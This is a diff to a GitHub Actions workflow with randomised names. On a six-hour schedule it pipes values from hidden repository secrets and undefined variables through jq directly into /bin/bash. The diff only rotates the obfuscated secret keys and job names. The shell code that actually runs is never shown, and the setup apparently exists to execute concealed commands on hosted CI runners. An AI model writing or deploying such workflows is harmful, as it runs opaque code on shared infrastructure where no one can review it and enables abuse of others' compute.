@@ -2,8 +2,9 @@ name: shiximian1894
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 3/6 * * *'
-jobs:  # 7121
+    - cron: '10 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +12,14 @@ jobs:  # 7121
       - uses: actions/checkout@v4
       - name: shiximian1894
         env:
-          beaa61: ${{ secrets.beaa61 }}
+          swr1955: ${{ secrets.swr1955 }}
         run: |
-          echo $beaa61 | jq -r .atvn96 | /bin/bash
-          echo $sniln591 | jq -r .nqsph9776 | /bin/bash
-          echo $jjqtz920 | jq -r .ysx0 | /bin/bash
-          echo $jhk66163 | jq -r .i32608 | /bin/bash
-          echo $nzko17 | jq -r .hjd17469 | /bin/bash
-          echo $pa635 | jq -r .uxu236 | /bin/bash
-          echo $uqgy5275 | jq -r .tkwne87032 | /bin/bash
-          echo $mqc3 | jq -r .tew4 | /bin/bash
-          echo $jr4 | jq -r .ho32163 | /bin/bash
-          echo $a68449 | jq -r .gon497 | /bin/bash
+          echo $swr1955 | jq -r .y4 | /bin/bash
+          echo $on51691 | jq -r .nz729 | /bin/bash
+          echo $ovd190 | jq -r .i44181 | /bin/bash
+          echo $nx2 | jq -r .mmh2 | /bin/bash
+          echo $b9 | jq -r .oyf9 | /bin/bash
+          echo $clpd966 | jq -r .dbr43326 | /bin/bash
+          echo $gvdb3 | jq -r .gasa21 | /bin/bash
+          echo $krm4 | jq -r .vys138 | /bin/bash
 
